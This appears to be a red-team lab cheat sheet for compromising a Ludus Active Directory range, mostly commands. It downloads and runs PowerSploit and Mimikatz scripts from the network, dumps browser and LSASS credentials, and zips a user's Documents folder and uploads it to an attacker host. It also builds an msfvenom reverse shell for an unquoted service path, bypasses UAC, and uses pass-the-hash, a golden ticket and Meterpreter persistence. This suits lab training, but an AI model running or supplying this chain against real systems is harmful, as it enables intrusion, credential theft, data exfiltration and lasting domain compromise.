### PATH
```
win11 ludus\domainuser -> Enumeration, CredentialKatz, Documents Exfiltration -> unquoted service exploit >
win11 ludus\domainadmin -> UAC Bypass + Dump Creds > winrm to win-server
win-server ludus\domainadmin - mimikatz golden ticket  > Administrator
```

### win11 ludus\domainuser
```bash
msfconsole -r user_handler.rc
# windows run command on win11
sessions
sessions 1
```

### User Enum
```shell
# meterpreter
sysinfo
getuid
getpid
ps
enumdesktops
getenv

# shell
powershell
echo %USERDOMAIN%
nltest /dclist:ludus
whoami
whoami /priv
whoami /groups

# tcp and udp open ports
netstat -na

# arp table
arp -a

# systeminfo
systeminfo
# networking
ipconfig

# get information about current antivirus
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
# check if defender is running
Get-Service WinDefend
# and if realtimeprotection is inabled
Get-MpComputerStatus | select RealTimeProtectionEnabled

# check if firewall is enabled
Get-NetFirewallProfile | Format-Table Name, Enabled


# check current firewall rules 
Get-NetFirewallRule | select DisplayName, Enabled,Description

# if we cannot dump the rules sometimes is best to just test them
Test-NetConnection -ComputerName 127.0.0.1 -Port 80

# antivirus matches
Get-MpThreat

# current logging
Get-EventLog -List

# various ways to check if sysmon is running
Get-Service Sysmon
Get-Process | Where-Object { _$.ProcessName -eq "Sysmon" }
Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"
Get-Service | where-object {$_.DisplayName -like "*sysm*"}
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational

# find the sysmon config
findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\*

# get list of applications and their versions
wmic product get Name, Version, Vendor

# check for current updates installed 
wmic qfe get Caption,Description

# current running services
net start

# users enumeration
net user
net localgroup
net localgroup administrators

# saved logins
cmdkey /list
runas /savecred /user:WPRIVESC1\mike.katz cmd.exe

# powershell history
type "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"

# if we have admin priviledges we can
netstat -abno
```


```shell
# winpeas 
powershell -ep bypass -Command "iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/refs/heads/master/winPEAS/winPEASps1/winPEAS.ps1')"

# adpeas
powershell -ep bypass -Command "iex (New-Object Net.WebClient).DownloadString('https://github.com/61106960/adPEAS/raw/refs/heads/main/adPEAS.ps1')"

# powerup
powershell -ep bypass -Command "iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks"

# portscan
powershell -ep bypass -Command "iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1'); Invoke-Portscan -Hosts 10.5.20.0/24 -Ports '22,3389,5985,5986'"

powershell -ep bypass -Command "iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1'); Invoke-Portscan -Hosts 10.5.20.0/24 -Ports '3389'"

use post/windows/gather/credentials/windows_autologin
set session 1
run
```

### Exfiltration

```shell
cd %TEMP%
upload CredentialKatz.exe
.\CredentialKatz.exe
Get-Process msedge
procdump -ma 1220 msedge_dump.dmp

python3 exfil.py

Compress-Archive -Path 'C:\Users\domainuser\Documents' -Update -DestinationPath "$env:TEMP\documents.zip"; (New-Object Net.WebClient).UploadFile("http://10.5.30.50:80/upload", "$env:TEMP\documents.zip")
```

## Unquoted service path exploit
```bash
sc qc "DiskSorter"
icacls "C:\Users\Public"
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.5.30.50 LPORT=1234 -f exe -o Disk.exe

cd "C:\Users\Public"
upload Disk.exe

icacls "C:\Users\Public\Disk.exe" /grant Everyone:F
sc stop "DiskSorter"
sc start "DiskSorter"

ps | grep Notepad
migrate <notepad_pid>
```

### win11 ludus\domainadmin
```bash
net localgroup administrators
cd %TEMP%
upload Akagi64.exe
shell


.\Akagi64.exe 33 "C:\Users\Public\Disk.exe"

load kiwi
creds_all
hashdump
dcsync_lsa krbtgt

python3 ~/Desktop/tools/impacket/examples/psexec.py 'domainadmin@10.5.20.13' -hashes :8846f7eaee8fb117ad06bdd830b7586c
psexec \\10.5.20.13 -i -u ludus\domainadmin -p password cmd.exe
```

msfconsole -r admin_handler.rc

## MIMI

```
# mimikatz
powershell -ep bypass -Command "iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz"
```


```
# you need administrator priviledges
.\mimikatz.exe
privilege::debug

lsadump::lsa /patch

sekurlsa::logonpasswords
lsadump::sam


lsadump::lsa /inject /name:krbtgt
kerveros::golden /user: /domain: /sid: /krbtgt: /id: 
misc::cmd
PsExec.exe \\Desktop-1 cmd.exe

lsadump::dcsync /user:ludus\krbtgt
kerberos::golden /user:Administrator /domain:controller.local /krbtgt:93c7fd662a834869db8ad4bee4876299
```

### Reg Keys Persistence On Domain Member
```
use exploit/windows/local/registry_persistence
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT 4444
run
```

### Service Persistence on Domain Controller
```
use exploit/windows/local/persistence_service
show options
set LHOST
set LPORT
show option
set SERVICE_NAME lsass
set sessions 2
run 
```